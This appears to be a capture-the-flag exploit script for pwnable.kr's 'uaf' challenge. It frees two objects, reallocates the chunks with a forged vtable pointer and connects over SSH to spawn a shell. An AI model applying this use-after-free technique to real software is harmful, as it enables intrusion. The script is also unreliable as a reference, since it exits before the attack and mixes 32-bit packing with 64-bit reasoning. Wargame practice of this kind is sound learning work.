#!/usr/bin/env python3

import pwn

"""
Idea:
1. Need to delete the two instances by sending "3\n"
2. Need to feed in data through a file ./uaf <length> <file-with-length-data> and by sending "2\n"
   such that the virtual table will point to a table containg the function named 'give_shell'.
   But do we need to know all about how malloc and free are used to make this work?
   The memory is probably added to a free-list and as such we should request memory
   of the same size as the allocated classes.
3. Use the instances by sending "1\n"


At the moment introduce() is being called, rax contains the ptr to man.
At offset 8, the function for introduce() is loaded.
Thus we need to point to a place where at +8 the address of give_shell is located.

0x401570 contains the virtual table for Man, and the address of introduce is located at +8.
At +0 contains the address of give_shell. Thus if we use 0x401570-8 = 0x401568, then
+8 will contain give_shell.

We need to add our payload two times, since else only the woman instance is overwritten, and
calling man will crash.

I had a lot of troubles trying to debug this in gdb. Maybe GDB changes the program flow, because
whatever I sent in the payload, even of size 24, did not make a difference.
"""

pwn.context(arch = "i386", os = "linux", log_level='debug')
random_file = "/tmp/%s" % pwn.util.fiddling.randoms(10)
size_of_new = 24
payload_length = size_of_new
payload = pwn.p32(0x401568) + b'a' * (size_of_new - 4)
print(pwn.hexdump(payload))

exit(1)

r = pwn.ssh("uaf", "pwnable.kr", 2222, "guest")
r.upload_data(payload, random_file)
p = r.process(["./uaf", str(payload_length), random_file])
p.recvuntil('1. use\n2. after\n3. free\n')
p.sendline('3');
p.recvuntil('1. use\n2. after\n3. free\n')
p.sendline('2');
p.recvuntil('1. use\n2. after\n3. free\n')
p.sendline('2');
p.recvuntil('1. use\n2. after\n3. free\n')
p.sendline('1');
p.interactive()